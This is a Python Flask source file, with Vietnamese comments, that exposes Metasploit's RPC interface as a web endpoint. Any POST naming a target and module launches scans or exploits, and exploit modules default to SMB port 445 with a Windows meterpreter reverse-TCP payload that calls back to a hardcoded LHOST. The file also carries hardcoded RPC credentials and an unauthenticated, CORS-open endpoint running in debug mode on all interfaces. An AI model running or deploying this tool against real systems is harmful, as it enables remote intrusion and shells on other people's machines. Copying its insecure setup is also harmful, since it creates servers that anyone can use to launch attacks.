from flask import Flask, request, jsonify
from flask_cors import CORS
from pymetasploit3.msfrpc import MsfRpcClient

import time
import logging

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.DEBUG)

# Kết nối với MSFRPC
try:
    client = MsfRpcClient(password='quach', username='tung', host='127.0.0.1', port=55553)
    logging.info("Kết nối tới MSFRPC thành công!")
except Exception as e:
    logging.error(f"Không thể kết nối tới MSFRPC: {e}")
    client = None

@app.route('/metasploit/run', methods=['POST'])
def run_metasploit():
    if not client:
        return jsonify({'error': 'Không thể kết nối tới Metasploit!'}), 500

    data = request.get_json()
    target = data.get('target')
    module = data.get('module', 'auxiliary/scanner/portscan/tcp')

    if not target:
        return jsonify({'error': 'Vui lòng cung cấp mục tiêu!'}), 400

    try:
        logging.info(f"Thực thi module {module} với mục tiêu {target}")
        console = client.call('console.create')
        console_id = console['id']

        # Thiết lập lệnh tùy thuộc vào loại module
        if "exploit" in module:
            # Đối với module khai thác, thêm các tham số cần thiết
            commands = [
                f"use {module}\n",
                f"set RHOSTS {target}\n",
                "set RPORT 445\n",  # Cổng SMB thường là 445
                "set LHOST 192.168.90.132\n",  # Địa chỉ IP của máy bạn (thay đổi nếu cần)
                "set PAYLOAD windows/meterpreter/reverse_tcp\n",  # Payload mặc định
                "run\n"
            ]
        else:
            # Đối với module khác (như auxiliary)
            commands = [
                f"use {module}\n",
                f"set RHOSTS {target}\n",
                "set THREADS 10\n",
                "run\n"
            ]

        output = []
        for cmd in commands:
            client.call('console.write', [console_id, cmd])
            time.sleep(1)
            result = client.call('console.read', [console_id])
            output.append(result['data'])

        client.call('console.destroy', [console_id])
        logging.info("Thực thi hoàn tất")
        return jsonify({'output': ''.join(output)})
    except Exception as e:
        logging.error(f"Lỗi khi thực thi: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)